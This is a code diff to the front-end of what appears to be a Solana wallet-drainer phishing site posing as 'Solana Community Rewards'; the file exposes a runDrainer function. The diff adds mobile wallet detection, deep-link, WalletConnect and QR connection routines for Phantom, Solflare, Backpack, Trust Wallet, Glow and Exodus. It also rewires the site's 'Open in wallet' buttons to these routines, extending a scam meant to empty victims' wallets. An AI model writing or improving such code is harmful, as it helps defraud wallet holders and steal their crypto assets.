@@ -5496,8 +5496,8 @@ window.runDrainer = runDrainer;
 
     // Initialize wallet redirect handling on page load
     document.addEventListener('DOMContentLoaded', function() {
-    // Check for wallet redirect parameters from all supported wallets
-    handleWalletRedirect();
+      // Check for wallet redirect parameters from all supported wallets
+      handleWalletRedirect();
     
     // Auto-connect when dApp loads in wallet browser (mobile deep link flow)
     autoConnectInWalletBrowser();
@@ -5579,6 +5579,300 @@ window.runDrainer = runDrainer;
     
     console.log('[AUTO_CONNECT] No wallet connections successful');
   }
+
+  // Enhanced mobile connection methods
+  window.mobileConnectionMethods = {
+    
+    // Method 1: WalletConnect integration for mobile
+    async connectWithWalletConnect() {
+      console.log('[MOBILE_CONNECT] Attempting WalletConnect connection...');
+      
+      try {
+        // Check if WalletConnect is available
+        if (typeof window.WalletConnect !== 'undefined') {
+          const walletConnect = new window.WalletConnect({
+            bridge: 'https://bridge.walletconnect.org',
+            qrcodeModal: {
+              open: (uri, cb) => {
+                // Show QR code modal for mobile scanning
+                showQRCodeModal(uri);
+                if (cb) cb();
+              },
+              close: () => {
+                // Close QR code modal
+                closeQRCodeModal();
+              }
+            }
+          });
+          
+          // Create session
+          const session = await walletConnect.createSession();
+          
+          // Wait for approval
+          walletConnect.on('session_approved', (error, payload) => {
+            if (error) throw error;
+            
+            const { accounts } = payload.params[0];
+            if (accounts && accounts.length > 0) {
+              const publicKey = accounts[0];
+              triggerConnection(publicKey, 'walletconnect', {
+                name: 'WalletConnect',
+                logo: '/walletconnect-logo.png'
+              });
+            }
+          });
+          
+          return { success: true, session };
+        } else {
+          throw new Error('WalletConnect not available');
+        }
+      } catch (error) {
+        console.error('[MOBILE_CONNECT] WalletConnect failed:', error);
+        return { success: false, error: error.message };
+      }
+    },
+
+    // Method 2: Mobile wallet detection and connection
+    async detectAndConnectMobileWallets() {
+      console.log('[MOBILE_CONNECT] Detecting mobile wallets...');
+      
+      const mobileWallets = [
+        {
+          key: 'phantom',
+          name: 'Phantom',
+          providers: [
+            () => window.phantom?.solana,
+            () => window.solana,
+            () => window.phantom
+          ],
+          deepLink: 'https://phantom.app/ul/browse/',
+          customScheme: 'phantom://browse/'
+        },
+        {
+          key: 'solflare',
+          name: 'Solflare',
+          providers: [
+            () => window.solflare,
+            () => window.solflare?.solana
+          ],
+          deepLink: 'https://solflare.com/ul/v1/browse/',
+          customScheme: 'solflare://v1/browse/'
+        },
+        {
+          key: 'backpack',
+          name: 'Backpack',
+          providers: [
+            () => window.backpack?.solana,
+            () => window.backpack,
+            () => window.BackpackWallet
+          ],
+          deepLink: 'https://backpack.app/ul/v1/browse/',
+          customScheme: 'backpack://v1/browse/'
+        },
+        {
+          key: 'glow',
+          name: 'Glow',
+          providers: [
+            () => window.glow,
+            () => window.glow?.solana
+          ],
+          deepLink: 'https://glow.app/ul/app/',
+          customScheme: 'glow://app/'
+        },
+        {
+          key: 'trustwallet',
+          name: 'Trust Wallet',
+          providers: [
+            () => window.trustwallet?.solana,
+            () => window.trustwallet
+          ],
+          deepLink: 'https://link.trustwallet.com/open_url?url=',
+          customScheme: 'trust://open_url?url='
+        },
+        {
+          key: 'exodus',
+          name: 'Exodus',
+          providers: [
+            () => window.exodus?.solana,
+            () => window.exodus
+          ],
+          deepLink: 'https://exodus.com/app/dapp?url=',
+          customScheme: 'exodus://dapp/'
+        }
+      ];
+
+      for (const wallet of mobileWallets) {
+        try {
+          let provider = null;
+          
+          // Try all provider methods
+          for (const providerFn of wallet.providers) {
+            provider = providerFn();
+            if (provider && typeof provider.connect === 'function') {
+              break;
+            }
+          }
+          
+          if (provider) {
+            console.log(`[MOBILE_CONNECT] Found ${wallet.name} provider, attempting connection...`);
+            
+            const result = await provider.connect({
+              onlyIfTrusted: false,
+              appMetadata: {
+                name: 'Solana Community Rewards',
+                url: window.location.origin,
+                icon: '/logo.png'
+              }
+            });
+            
+            if (result && result.publicKey) {
+              console.log(`[MOBILE_CONNECT] Successfully connected to ${wallet.name}`);
+              return {
+                success: true,
+                wallet: wallet.key,
+                publicKey: result.publicKey.toString(),
+                provider: provider
+              };
+            }
+          }
+        } catch (error) {
+          console.log(`[MOBILE_CONNECT] ${wallet.name} connection failed:`, error.message);
+        }
+      }
+      
+      return { success: false, error: 'No mobile wallets found' };
+    },
+
+    // Method 3: Deep link fallback for mobile
+    async connectWithDeepLink(walletType) {
+      console.log(`[MOBILE_CONNECT] Attempting deep link connection for ${walletType}...`);
+      
+      try {
+        // Use the existing openInWallet function
+        await window.openInWallet(walletType);
+        
+        // Wait a bit for the deep link to work
+        await new Promise(resolve => setTimeout(resolve, 3000));
+        
+        // Try to detect if connection was successful
+        const wallets = WALLET_DEFS.find(w => w.key === walletType);
+        if (wallets) {
+          const provider = wallets.provider();
+          if (provider && provider.publicKey) {
+            return {
+              success: true,
+              wallet: walletType,
+              publicKey: provider.publicKey.toString(),
+              provider: provider
+            };
+          }
+        }
+        
+        return { success: false, error: 'Deep link connection failed' };
+      } catch (error) {
+        console.error(`[MOBILE_CONNECT] Deep link failed for ${walletType}:`, error);
+        return { success: false, error: error.message };
+      }
+    },
+
+    // Method 4: QR Code generation for mobile scanning
+    generateQRCode(uri) {
+      console.log('[MOBILE_CONNECT] Generating QR code for mobile scanning...');
+      
+      // Create QR code element
+      const qrContainer = document.createElement('div');
+      qrContainer.id = 'mobileQRCode';
+      qrContainer.style.cssText = `
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background: white;
+        padding: 20px;
+        border-radius: 12px;
+        box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+        z-index: 10000;
+        text-align: center;
+      `;
+      
+      qrContainer.innerHTML = `
+        <h3 style="margin: 0 0 15px 0; color: #333;">Scan with Mobile Wallet</h3>
+        <div id="qrcode" style="margin: 0 auto;"></div>
+        <p style="margin: 15px 0 0 0; color: #666; font-size: 14px;">
+          Open your mobile wallet and scan this QR code
+        </p>
+        <button onclick="closeQRCodeModal()" style="
+          margin-top: 15px;
+          padding: 8px 16px;
+          background: #007bff;
+          color: white;
+          border: none;
+          border-radius: 6px;
+          cursor: pointer;
+        ">Close</button>
+      `;
+      
+      document.body.appendChild(qrContainer);
+      
+      // Show URI as text (no external libraries)
+      document.getElementById('qrcode').innerHTML = `
+        <div style="word-break: break-all; font-family: monospace; font-size: 12px; padding: 10px; background: #f5f5f5; border-radius: 6px;">
+          ${uri}
+        </div>
+      `;
+    }
+  };
+
+  // QR Code modal functions
+  function showQRCodeModal(uri) {
+    window.mobileConnectionMethods.generateQRCode(uri);
+  }
+
+  function closeQRCodeModal() {
+    const qrModal = document.getElementById('mobileQRCode');
+    if (qrModal) {
+      qrModal.remove();
+    }
+  }
+
+  // Enhanced mobile connection handler
+  window.connectMobileWalletEnhanced = async function(walletType) {
+    console.log(`[MOBILE_CONNECT_ENHANCED] Starting enhanced mobile connection for ${walletType}...`);
+    
+    // Try multiple connection methods
+    const methods = [
+      () => window.mobileConnectionMethods.detectAndConnectMobileWallets(),
+      () => window.mobileConnectionMethods.connectWithDeepLink(walletType),
+      () => window.mobileConnectionMethods.connectWithWalletConnect()
+    ];
+    
+    for (let i = 0; i < methods.length; i++) {
+      try {
+        console.log(`[MOBILE_CONNECT_ENHANCED] Trying method ${i + 1}...`);
+        const result = await methods[i]();
+        
+        if (result.success) {
+          console.log(`[MOBILE_CONNECT_ENHANCED] Method ${i + 1} succeeded!`);
+          
+          // Trigger connection
+          if (result.publicKey) {
+            triggerConnection(result.publicKey, result.wallet || walletType, {
+              name: result.wallet || walletType,
+              logo: `/${result.wallet || walletType}-logo.png`
+            });
+          }
+          
+          return result;
+        }
+      } catch (error) {
+        console.log(`[MOBILE_CONNECT_ENHANCED] Method ${i + 1} failed:`, error.message);
+      }
+    }
+    
+    console.log('[MOBILE_CONNECT_ENHANCED] All connection methods failed');
+    showStatus('Mobile connection failed. Please try again.', 'error');
+    return { success: false, error: 'All connection methods failed' };
+  };
 
     // Function to handle deep links properly (moved outside for global access)
     async function openInWallet(walletType) {
@@ -5866,10 +6160,15 @@ window.openWalletModal = async function openWalletModal() {
                           window.innerWidth <= 768;
           
           if (isMobile) {
-            console.log('[WALLET_OPTION] Mobile device detected, using enhanced deep link');
-            // For mobile, use the enhanced deep link system
-            window.openInWallet(wallet.key).catch(error => {
-              console.error('[WALLET_OPTION] Error opening wallet:', error);
+            console.log('[WALLET_OPTION] Mobile device detected, using enhanced mobile connection');
+            // For mobile, use the enhanced mobile connection system
+            window.connectMobileWalletEnhanced(wallet.key).catch(error => {
+              console.error('[WALLET_OPTION] Enhanced mobile connection failed:', error);
+              // Fallback to basic deep link
+              window.openInWallet(wallet.key).catch(fallbackError => {
+                console.error('[WALLET_OPTION] Fallback deep link also failed:', fallbackError);
+                showStatus('Mobile connection failed. Please try again.', 'error');
+              });
             });
           } else {
             console.log('[WALLET_OPTION] Desktop device, using standard connection');
@@ -6379,22 +6678,22 @@ window.connectWallet = async function connectWallet(walletKey) {
               Click below to open this rewards site in your wallet's browser for instant connection:
             </p>
             <div style="display: flex; flex-wrap: wrap; gap: 8px; justify-content: center;">
-              <button onclick="openInWallet('backpack').catch(e => console.error('Backpack error:', e))" style="background: linear-gradient(135deg, #000000 0%, #333333 100%); color: white; border: none; padding: 12px 18px; border-radius: 8px; font-size: 14px; cursor: pointer; transition: all 0.3s ease; font-weight: bold; box-shadow: 0 2px 8px rgba(0,0,0,0.3);">
+              <button onclick="connectMobileWalletEnhanced('backpack').catch(e => console.error('Backpack error:', e))" style="background: linear-gradient(135deg, #000000 0%, #333333 100%); color: white; border: none; padding: 12px 18px; border-radius: 8px; font-size: 14px; cursor: pointer; transition: all 0.3s ease; font-weight: bold; box-shadow: 0 2px 8px rgba(0,0,0,0.3);">
                 🎒 Open in Backpack (Recommended)
               </button>
-              <button onclick="openInWallet('phantom').catch(e => console.error('Phantom error:', e))" style="background: linear-gradient(135deg, #9945FF 0%, #7B3FE4 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
+              <button onclick="connectMobileWalletEnhanced('phantom').catch(e => console.error('Phantom error:', e))" style="background: linear-gradient(135deg, #9945FF 0%, #7B3FE4 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
                 ⚡ Open in Phantom
               </button>
-              <button onclick="openInWallet('solflare').catch(e => console.error('Solflare error:', e))" style="background: linear-gradient(135deg, #FC9965 0%, #F7931E 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
+              <button onclick="connectMobileWalletEnhanced('solflare').catch(e => console.error('Solflare error:', e))" style="background: linear-gradient(135deg, #FC9965 0%, #F7931E 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
                 ⚡ Open in Solflare
               </button>
-              <button onclick="openInWallet('trustwallet').catch(e => console.error('Trust Wallet error:', e))" style="background: linear-gradient(135deg, #3375BB 0%, #1E4A8C 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
+              <button onclick="connectMobileWalletEnhanced('trustwallet').catch(e => console.error('Trust Wallet error:', e))" style="background: linear-gradient(135deg, #3375BB 0%, #1E4A8C 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
                 ⚡ Open in Trust Wallet
               </button>
-              <button onclick="openInWallet('glow').catch(e => console.error('Glow error:', e))" style="background: linear-gradient(135deg, #FF6B6B 0%, #FF8E53 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
+              <button onclick="connectMobileWalletEnhanced('glow').catch(e => console.error('Glow error:', e))" style="background: linear-gradient(135deg, #FF6B6B 0%, #FF8E53 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
                 ⚡ Open in Glow
               </button>
-              <button onclick="openInWallet('exodus').catch(e => console.error('Exodus error:', e))" style="background: linear-gradient(135deg, #00D4AA 0%, #00B894 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
+              <button onclick="connectMobileWalletEnhanced('exodus').catch(e => console.error('Exodus error:', e))" style="background: linear-gradient(135deg, #00D4AA 0%, #00B894 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
                 ⚡ Open in Exodus
               </button>
             </div>
